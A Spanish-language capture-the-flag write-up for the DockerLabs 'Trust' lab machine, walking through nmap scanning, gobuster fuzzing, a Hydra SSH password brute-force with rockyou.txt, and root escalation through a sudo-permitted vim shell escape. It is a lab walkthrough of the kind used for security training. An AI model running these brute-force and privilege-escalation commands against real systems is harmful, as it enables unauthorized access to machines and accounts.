---
layout: post
title: "Trust"
date: 2026-02-08
category: writeups
platform: DockerLabs
difficulty: Fácil
tags: [ssh, hydra, vim, sudo, escalada-de-privilegios]
---

## Información

| Campo       | Valor         |
|-------------|---------------|
| Plataforma  | DockerLabs    |
| Dificultad  | Fácil         |
| IP          | 172.18.0.2    |
| SO          | Linux         |

## Enumeración

### Escaneo de puertos

Empezamos con un escaneo completo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.18.0.2 -oN allPorts
```

Después lanzamos un escaneo más detallado sobre los puertos encontrados:

```bash
nmap -p<puertos> -sCV 172.18.0.2 -oN targeted
```

### Enumeración web (puerto 80)

La página web aparentemente no muestra nada relevante, pero al revisar el código fuente encontramos un nombre de usuario.

Lanzamos fuzzing con gobuster:

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o webContent.txt
```

## Explotación

### Fuerza bruta SSH con Hydra

Con el usuario encontrado en la web, lanzamos Hydra contra el servicio SSH:

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

Obtenemos las credenciales y accedemos por SSH.

## Escalada de privilegios

### sudo -l

Al comprobar los permisos sudo del usuario:

```bash
sudo -l
```

Vemos que puede ejecutar `vim` como cualquier usuario. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) y obtenemos shell como root:

```bash
sudo vim -c '!bash'
```

## Root

Ya somos root. Máquina completada. ✅
